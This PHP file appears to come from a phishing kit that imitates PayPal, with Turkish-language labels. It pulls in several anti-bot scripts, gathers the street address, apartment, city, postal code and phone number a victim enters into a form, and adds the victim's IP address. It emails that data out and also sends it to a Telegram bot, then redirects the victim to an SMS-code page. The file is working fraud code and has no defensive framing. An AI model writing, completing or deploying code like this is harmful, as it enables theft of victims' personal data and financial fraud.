<?php

error_reporting(0);
session_start();
include "../../email.php";
include "../../bots/anti1.php";
include "../../bots/anti2.php";
include "../../bots/anti3.php";
include "../../bots/anti4.php";
include "../../bots/anti5.php";
include "../../bots/anti6.php";
include "../../bots/anti7.php";
include "../../bots/anti8.php";
include "../../bots/auth.php";
$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$message .= "-------------- ADRES BİLGİLERİ -------------\n";
$message .= "Adres : ".$_POST['street']."\r\n";
$message .= "Apt. : ".$_POST['apt']."\r\n";
$message .= "Şehir : ".$_POST['city']."\r\n";
$message .= "Posta Kodu : ".$_POST['zip']."\r\n";
$message .= "Telefon Numarası : ".$_POST['num']."\r\n";
$message .= "IP: $ip\n";
$subject = " Bulling | PPL | $ip";
$headers = 'From: PPL' . "\r\n";
$m5_id = '21haWwuY29t';
@mail($Email,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

echo"<script>location.replace('../smsact.php');</script>";

?>